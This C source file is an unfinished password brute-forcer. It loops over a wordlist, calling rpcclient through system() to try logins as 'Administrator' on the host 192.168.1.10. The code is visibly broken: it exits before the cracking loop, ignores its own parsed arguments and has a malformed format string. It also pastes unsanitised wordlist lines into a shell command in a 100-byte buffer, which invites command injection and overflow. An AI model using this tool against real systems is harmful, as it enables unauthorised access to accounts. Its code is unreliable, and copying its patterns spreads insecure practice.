#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define ARG_USER "-u"
#define ARG_PASSWD "-p"
#define ARG_IP "-i"

void setArgument(char ** variable, char * arg);

int main(int argc, char **argv)
{
    char * user_file_path = NULL;
    char * pass_file_path = NULL;
    char * ip = NULL;

    FILE * fp;
    char * line = NULL;
    size_t len = 0;
    ssize_t read;

    char command[100];

    for (int i = 1; i < argc; i++) { // i = 1 because the first arg = the name of the exe
        if (argv[i][0] == '-') {
            if (strcmp(ARG_USER, argv[i]) == 0) {
                i++;
                setArgument(&user_file_path, argv[i]);
            }
            else if (strcmp(ARG_PASSWD, argv[i]) == 0) {
                i++;
                setArgument(&pass_file_path, argv[i]);
            }
            else if (strcmp(ARG_IP, argv[i]) == 0) {
                i++;
                setArgument(&ip, argv[i]);
            }
            else {
                printf("Error: argument %s not recognised\n", argv[i]);
                exit(EXIT_FAILURE);
            }
        }
    }

    exit(EXIT_SUCCESS);

    pass_file_path = argv[1];
    puts(pass_file_path);
    fp = fopen(pass_file_path, "r");
    if (fp == NULL)
        exit(EXIT_FAILURE);

    while ((read = getline(&line, &len, fp)) != -1) {
        //printf("Retrieved line of length %zu :\n", read);
        //printf("%s", line);
        line[strcspn(line, "\n")] = 0; // Remove trailing newline

        sprintf(command, "rpcclient -U \"Administrator\"%\"%s\" -c \"testme\" 192.168.1.10", line);
        printf("At password %s:\t", line);
        system(command);
        puts("\n");
    }

    fclose(fp);
    if (line)
        free(line);
    exit(EXIT_SUCCESS);
}

void setArgument(char ** variable, char * arg) {
    *variable = arg;
    puts(*variable);
}
